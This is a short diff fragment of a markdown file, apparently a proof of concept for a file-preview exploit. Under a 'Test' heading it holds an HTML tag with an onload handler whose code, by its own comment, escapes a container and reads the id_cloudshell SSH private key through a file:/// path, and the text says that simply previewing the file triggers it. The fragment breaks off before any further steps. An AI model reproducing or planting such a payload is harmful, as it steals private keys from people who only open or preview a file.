@@ -50,7 +50,7 @@ just need to preview this file to see the magic
 
 ### Test
 
-<style onload="{   
+<script onload="{   
     var file_results = []  
     // this scape the container and get the ssh id_cloudshell private key
     read_file('file:///../id_cloudshell')          
